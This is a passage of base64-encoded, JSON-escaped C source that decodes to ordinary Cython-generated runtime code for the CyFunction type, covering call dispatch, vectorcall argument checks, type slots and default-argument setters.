X3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKFxuICAgICAgICAgICAgICAgIChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jLFxuICAgICAgICAgICAgICAgICJ0YWtlcyBubyBhcmd1bWVudHMiLCBzaXplKTtcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgTUVUSF9POlxuICAgICAgICBpZiAobGlrZWx5KGt3ID09IE5VTEwgfHwgUHlEaWN0X1NpemUoa3cpID09IDApKSB7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX0dFVF9TSVpFKGFyZyk7XG4jZWxzZVxuICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfU2l6ZShhcmcpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNpemUgPCAwKSkgcmV0dXJuIE5VTEw7XG4jZW5kaWZcbiAgICAgICAgICAgIGlmIChsaWtlbHkoc2l6ZSA9PSAxKSkge1xuICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpyZXN1bHQsICphcmcwO1xuICAgICAgICAgICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICAgICAgICAgIGFyZzAgPSBQeVR1cGxlX0dFVF9JVEVNKGFyZywgMCk7XG4gICAgICAgICAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgICAgICBhcmcwID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKGFyZywgMCk7IGlmICh1bmxpa2VseSghYXJnMCkpIHJldHVybiBOVUxMO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIHJlc3VsdCA9ICgqbWV0aCkoc2VsZiwgYXJnMCk7XG4gICAgICAgICAgICAgICAgI2lmICEoQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMpXG4gICAgICAgICAgICAgICAgUHlfREVDUkVGKGFyZzApO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIHJldHVybiByZXN1bHQ7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKFxuICAgICAgICAgICAgICAgIChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jLFxuICAgICAgICAgICAgICAgICJ0YWtlcyBleGFjdGx5IG9uZSBhcmd1bWVudCIsIHNpemUpO1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICAgICAgYnJlYWs7XG4gICAgZGVmYXVsdDpcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1N5c3RlbUVycm9yLCAiQmFkIGNhbGwgZmxhZ3MgZm9yIEN5RnVuY3Rpb24iKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcihcbiAgICAgICAgKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMsICJ0YWtlcyBubyBrZXl3b3JkIGFyZ3VtZW50cyIpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fQ2FsbChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmFyZywgUHlPYmplY3QgKmt3KSB7XG4gICAgUHlPYmplY3QgKnNlbGYsICpyZXN1bHQ7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZnVuYyktPmZ1bmMpO1xuICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jKS0+bV9zZWxmO1xuI2VuZGlmXG4gICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9DYWxsTWV0aG9kKGZ1bmMsIHNlbGYsIGFyZywga3cpO1xuICAgIHJldHVybiByZXN1bHQ7XG59XG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fQ2FsbEFzTWV0aG9kKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJncywgUHlPYmplY3QgKmt3KSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jO1xuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIChDWVRIT05fVkVDVE9SQ0FMTCB8fCBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTClcbiAgICAgX19weXhfdmVjdG9yY2FsbGZ1bmMgdmMgPSBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChjeWZ1bmMpO1xuICAgIGlmICh2Yykge1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgcmV0dXJuIF9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3QoZnVuYywgdmMsICZQeVR1cGxlX0dFVF9JVEVNKGFyZ3MsIDApLCAoc2l6ZV90KVB5VHVwbGVfR0VUX1NJWkUoYXJncyksIGt3KTtcbiNlbHNlXG4gICAgICAgICh2b2lkKSAmX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdDtcbiAgICAgICAgcmV0dXJuIFB5VmVjdG9yY2FsbF9DYWxsKGZ1bmMsIGFyZ3MsIGt3KTtcbiNlbmRpZlxuICAgIH1cbiNlbmRpZlxuICAgIGlmICgoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fQ0NMQVNTKSAmJiAhKGN5ZnVuYy0+ZmxhZ3MgJiBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCkpIHtcbiAgICAgICAgUHlfc3NpemVfdCBhcmdjO1xuICAgICAgICBQeU9iamVjdCAqbmV3X2FyZ3M7XG4gICAgICAgIFB5T2JqZWN0ICpzZWxmO1xuI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9TSVpFXG4gICAgICAgIGFyZ2MgPSBQeVR1cGxlX0dFVF9TSVpFKGFyZ3MpO1xuI2Vsc2VcbiAgICAgICAgYXJnYyA9IFB5VHVwbGVfU2l6ZShhcmdzKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KGFyZ2MgPCAwKSkgcmV0dXJuIE5VTEw7XG4jZW5kaWZcbiAgICAgICAgbmV3X2FyZ3MgPSBQeVR1cGxlX0dldFNsaWNlKGFyZ3MsIDEsIGFyZ2MpO1xuICAgICAgICBpZiAodW5saWtlbHkoIW5ld19hcmdzKSlcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICBzZWxmID0gUHlUdXBsZV9HZXRJdGVtKGFyZ3MsIDApO1xuICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpKSB7XG4gICAgICAgICAgICBQeV9ERUNSRUYobmV3X2FyZ3MpO1xuICAgICAgICAgICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAgICAgICAgICAidW5ib3VuZCBtZXRob2QgJS4yMDBTKCkgbmVlZHMgYW4gYXJndW1lbnQiLFxuICAgICAgICAgICAgICAgICAgICAgICAgIGN5ZnVuYy0+ZnVuY19xdWFsbmFtZSk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoZnVuYywgc2VsZiwgbmV3X2FyZ3MsIGt3KTtcbiAgICAgICAgUHlfREVDUkVGKG5ld19hcmdzKTtcbiAgICB9IGVsc2Uge1xuICAgICAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGwoZnVuYywgYXJncywga3cpO1xuICAgIH1cbiAgICByZXR1cm4gcmVzdWx0O1xufVxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIChDWVRIT05fVkVDVE9SQ0FMTCB8fCBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTClcbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYywgUHlfc3NpemVfdCBuYXJncywgUHlPYmplY3QgKmt3bmFtZXMpXG57XG4gICAgaW50IHJldCA9IDA7XG4gICAgaWYgKChjeWZ1bmMtPmZsYWdzICYgX19QeXhfQ1lGVU5DVElPTl9DQ0xBU1MpICYmICEoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fU1RBVElDTUVUSE9EKSkge1xuICAgICAgICBpZiAodW5saWtlbHkobmFyZ3MgPCAxKSkge1xuICAgICAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV90eXBlX2Vycm9yKFxuICAgICAgICAgICAgICAgIGN5ZnVuYywgIm5lZWRzIGFuIGFyZ3VtZW50Iik7XG4gICAgICAgICAgICByZXR1cm4gLTE7XG4gICAgICAgIH1cbiAgICAgICAgcmV0ID0gMTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KGt3bmFtZXMpICYmIHVubGlrZWx5KF9fUHl4X1B5VHVwbGVfR0VUX1NJWkUoa3duYW1lcykpKSB7XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfdHlwZV9lcnJvcihcbiAgICAgICAgICAgIGN5ZnVuYywgInRha2VzIG5vIGtleXdvcmQgYXJndW1lbnRzIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIHJldDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9OT0FSR1MoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpXG57XG4gICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKilmdW5jO1xuI2lmIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMXG4gICAgUHlfc3NpemVfdCBuYXJncyA9IChQeV9zc2l6ZV90KW5hcmdzZjtcbiNlbHNlXG4gICAgUHlfc3NpemVfdCBuYXJncyA9IFB5VmVjdG9yY2FsbF9OQVJHUyhuYXJnc2YpO1xuI2VuZGlmXG4gICAgUHlPYmplY3QgKnNlbGY7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihjeWZ1bmMtPmZ1bmMpO1xuICAgIGlmICh1bmxpa2VseSghbWV0aCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9tbC0+bWxfbWV0aDtcbiNlbmRpZlxuICAgIHN3aXRjaCAoX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0NoZWNrQXJncyhjeWZ1bmMsIG5hcmdzLCBrd25hbWVzKSkge1xuICAgIGNhc2UgMTpcbiAgICAgICAgc2VsZiA9IGFyZ3NbMF07XG4gICAgICAgIGFyZ3MgKz0gMTtcbiAgICAgICAgbmFyZ3MgLT0gMTtcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSAwOlxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICAgICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5mdW5jKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgICAgIHNlbGYgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX3NlbGY7XG4jZW5kaWZcbiAgICAgICAgYnJlYWs7XG4gICAgZGVmYXVsdDpcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIGlmICh1bmxpa2VseShuYXJncyAhPSAwKSkge1xuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX2FyZ3VtZW50X2NvdW50X2Vycm9yKFxuICAgICAgICAgICAgY3lmdW5jLCAidGFrZXMgbm8gYXJndW1lbnRzIiwgbmFyZ3MpO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgcmV0dXJuIG1ldGgoc2VsZiwgTlVMTCk7XG59XG5zdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfTyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcylcbntcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7XG4jaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTExcbiAgICBQeV9zc2l6ZV90IG5hcmdzID0gKFB5X3NzaXplX3QpbmFyZ3NmO1xuI2Vsc2VcbiAgICBQeV9zc2l6ZV90IG5hcmdzID0gUHlWZWN0b3JjYWxsX05BUkdTKG5hcmdzZik7XG4jZW5kaWZcbiAgICBQeU9iamVjdCAqc2VsZjtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlDRnVuY3Rpb24gbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGN5ZnVuYy0+ZnVuYyk7XG4gICAgaWYgKHVubGlrZWx5KCFtZXRoKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX21sLT5tbF9tZXRoO1xuI2VuZGlmXG4gICAgc3dpdGNoIChfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKGN5ZnVuYywgbmFyZ3MsIGt3bmFtZXMpKSB7XG4gICAgY2FzZSAxOlxuICAgICAgICBzZWxmID0gYXJnc1swXTtcbiAgICAgICAgYXJncyArPSAxO1xuICAgICAgICBuYXJncyAtPSAxO1xuICAgICAgICBicmVhaztcbiAgICBjYXNlIDA6XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPmZ1bmMpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpICYmIFB5RXJyX09jY3VycmVkKCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICAgICAgc2VsZiA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fc2VsZjtcbiNlbmRpZlxuICAgICAgICBicmVhaztcbiAgICBkZWZhdWx0OlxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KG5hcmdzICE9IDEpKSB7XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfYXJndW1lbnRfY291bnRfZXJyb3IoXG4gICAgICAgICAgICBjeWZ1bmMsICJ0YWtlcyBleGFjdGx5IG9uZSBhcmd1bWVudCIsIG5hcmdzKTtcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgfVxuICAgIHJldHVybiBtZXRoKHNlbGYsIGFyZ3NbMF0pO1xufVxuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YsIFB5T2JqZWN0ICprd25hbWVzKVxue1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYyA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopZnVuYztcbiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTFxuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSAoUHlfc3NpemVfdCluYXJnc2Y7XG4jZWxzZVxuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBQeVZlY3RvcmNhbGxfTkFSR1MobmFyZ3NmKTtcbiNlbmRpZlxuICAgIFB5T2JqZWN0ICpzZWxmO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oY3lmdW5jLT5mdW5jKTtcbiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgUHlDRnVuY3Rpb24gbWV0aCA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fbWwtPm1sX21ldGg7XG4jZW5kaWZcbiAgICBzd2l0Y2ggKF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9DaGVja0FyZ3MoY3lmdW5jLCBuYXJncywgTlVMTCkpIHtcbiAgICBjYXNlIDE6XG4gICAgICAgIHNlbGYgPSBhcmdzWzBdO1xuICAgICAgICBhcmdzICs9IDE7XG4gICAgICAgIG5hcmdzIC09IDE7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgMDpcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmO1xuI2VuZGlmXG4gICAgICAgIGJyZWFrO1xuICAgIGRlZmF1bHQ6XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXR1cm4gKChfX1B5eF9QeUNGdW5jdGlvbkZhc3RXaXRoS2V5d29yZHMpKHZvaWQoKikodm9pZCkpbWV0aCkoc2VsZiwgYXJncywgbmFyZ3MsIGt3bmFtZXMpO1xufVxuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX0ZBU1RDQUxMX0tFWVdPUkRTX01FVEhPRChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcylcbntcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7XG4gICAgUHlUeXBlT2JqZWN0ICpjbHMgPSAoUHlUeXBlT2JqZWN0ICopIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooY3lmdW5jKTtcbiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTFxuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSAoUHlfc3NpemVfdCluYXJnc2Y7XG4jZWxzZVxuICAgIFB5X3NzaXplX3QgbmFyZ3MgPSBQeVZlY3RvcmNhbGxfTkFSR1MobmFyZ3NmKTtcbiNlbmRpZlxuICAgIFB5T2JqZWN0ICpzZWxmO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeUNGdW5jdGlvbiBtZXRoID0gUHlDRnVuY3Rpb25fR2V0RnVuY3Rpb24oY3lmdW5jLT5mdW5jKTtcbiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgUHlDRnVuY3Rpb24gbWV0aCA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fbWwtPm1sX21ldGg7XG4jZW5kaWZcbiAgICBzd2l0Y2ggKF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9DaGVja0FyZ3MoY3lmdW5jLCBuYXJncywgTlVMTCkpIHtcbiAgICBjYXNlIDE6XG4gICAgICAgIHNlbGYgPSBhcmdzWzBdO1xuICAgICAgICBhcmdzICs9IDE7XG4gICAgICAgIG5hcmdzIC09IDE7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgMDpcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgICAgIHNlbGYgPSBQeUNGdW5jdGlvbl9HZXRTZWxmKCgoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+ZnVuYyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghc2VsZikgJiYgUHlFcnJfT2NjdXJyZWQoKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgICAgICBzZWxmID0gKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV9zZWxmO1xuI2VuZGlmXG4gICAgICAgIGJyZWFrO1xuICAgIGRlZmF1bHQ6XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXR1cm4gKChfX1B5eF9QeUNNZXRob2QpKHZvaWQoKikodm9pZCkpbWV0aCkoc2VsZiwgY2xzLCBhcmdzLCAoc2l6ZV90KW5hcmdzLCBrd25hbWVzKTtcbn1cbiNlbmRpZlxuc3RhdGljIFB5VHlwZV9TbG90IF9fcHl4X0N5RnVuY3Rpb25UeXBlX3Nsb3RzW10gPSB7XG4gICAge1B5X3RwX2RlYWxsb2MsICh2b2lkICopX19QeXhfQ3lGdW5jdGlvbl9kZWFsbG9jfSxcbiAgICB7UHlfdHBfcmVwciwgKHZvaWQgKilfX1B5eF9DeUZ1bmN0aW9uX3JlcHJ9LFxuICAgIHtQeV90cF9jYWxsLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fQ2FsbEFzTWV0aG9kfSxcbiAgICB7UHlfdHBfdHJhdmVyc2UsICh2b2lkICopX19QeXhfQ3lGdW5jdGlvbl90cmF2ZXJzZX0sXG4gICAge1B5X3RwX2NsZWFyLCAodm9pZCAqKV9fUHl4X0N5RnVuY3Rpb25fY2xlYXJ9LFxuICAgIHtQeV90cF9tZXRob2RzLCAodm9pZCAqKV9fcHl4X0N5RnVuY3Rpb25fbWV0aG9kc30sXG4gICAge1B5X3RwX21lbWJlcnMsICh2b2lkICopX19weXhfQ3lGdW5jdGlvbl9tZW1iZXJzfSxcbiAgICB7UHlfdHBfZ2V0c2V0LCAodm9pZCAqKV9fcHl4X0N5RnVuY3Rpb25fZ2V0c2V0c30sXG4gICAge1B5X3RwX2Rlc2NyX2dldCwgKHZvaWQgKilfX1B5eF9QeU1ldGhvZF9OZXd9LFxuICAgIHswLCAwfSxcbn07XG5zdGF0aWMgUHlUeXBlX1NwZWMgX19weXhfQ3lGdW5jdGlvblR5cGVfc3BlYyA9IHtcbiAgICBfX1BZWF9UWVBFX01PRFVMRV9QUkVGSVggImN5dGhvbl9mdW5jdGlvbl9vcl9tZXRob2QiLFxuICAgIHNpemVvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KSxcbiAgICAwLFxuI2lmZGVmIFB5X1RQRkxBR1NfTUVUSE9EX0RFU0NSSVBUT1JcbiAgICBQeV9UUEZMQUdTX01FVEhPRF9ERVNDUklQVE9SIHxcbiNlbmRpZlxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG4jaWYgZGVmaW5lZChQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTClcbiAgICBQeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTCB8XG4jZWxpZiBkZWZpbmVkKF9QeV9UUEZMQUdTX0hBVkVfVkVDVE9SQ0FMTClcbiAgICBfUHlfVFBGTEFHU19IQVZFX1ZFQ1RPUkNBTEwgfFxuI2VuZGlmXG4jZW5kaWYgLy8gQ1lUSE9OX01FVEhfRkFTVENBTExcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMDAwXG4gICAgUHlfVFBGTEFHU19JTU1VVEFCTEVUWVBFIHxcbiNlbmRpZlxuICAgIFB5X1RQRkxBR1NfREVGQVVMVCB8IFB5X1RQRkxBR1NfSEFWRV9HQyB8IFB5X1RQRkxBR1NfQkFTRVRZUEUsXG4gICAgX19weXhfQ3lGdW5jdGlvblR5cGVfc2xvdHNcbn07XG5zdGF0aWMgaW50IF9fcHl4X0N5RnVuY3Rpb25faW5pdChQeU9iamVjdCAqbW9kdWxlKSB7XG4gICAgX19weXhfbXN0YXRldHlwZSAqbXN0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobW9kdWxlKTtcbiAgICBtc3RhdGUtPl9fcHl4X0N5RnVuY3Rpb25UeXBlID0gX19QeXhfRmV0Y2hDb21tb25UeXBlRnJvbVNwZWMoXG4gICAgICAgIG1zdGF0ZS0+X19weXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NUeXBlLCBtb2R1bGUsICZfX3B5eF9DeUZ1bmN0aW9uVHlwZV9zcGVjLCBOVUxMKTtcbiAgICBpZiAodW5saWtlbHkobXN0YXRlLT5fX3B5eF9DeUZ1bmN0aW9uVHlwZSA9PSBOVUxMKSkge1xuICAgICAgICByZXR1cm4gLTE7XG4gICAgfVxuICAgIHJldHVybiAwO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fSW5pdERlZmF1bHRzKFB5T2JqZWN0ICpmdW5jLCBQeVR5cGVPYmplY3QgKmRlZmF1bHRzX3R5cGUpIHtcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYztcbiAgICBtLT5kZWZhdWx0cyA9IFB5T2JqZWN0X0NhbGxPYmplY3QoKFB5T2JqZWN0KilkZWZhdWx0c190eXBlLCBOVUxMKTsgLy8gX1B5T2JqZWN0X05ldyhkZWZhdWx0c190eXBlKTtcbiAgICBpZiAodW5saWtlbHkoIW0tPmRlZmF1bHRzKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgcmV0dXJuIG0tPmRlZmF1bHRzO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9DeUZ1bmN0aW9uX1NldERlZmF1bHRzVHVwbGUoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICp0dXBsZSkge1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0gPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSBmdW5jO1xuICAgIG0tPmRlZmF1bHRzX3R1cGxlID0gdHVwbGU7XG4gICAgUHlfSU5DUkVGKHR1cGxlKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9TZXREZWZhdWx0c0t3RGljdChQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmRpY3QpIHtcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptID0gKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgZnVuYztcbiAgICBtLT5kZWZhdWx0c19rd2RpY3QgPSBkaWN0O1xuICAgIFB5X0lOQ1JFRihkaWN0KTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9TZXRBbm5vdGF0aW9uc0RpY3QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpkaWN0KSB7XG4gICAgX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0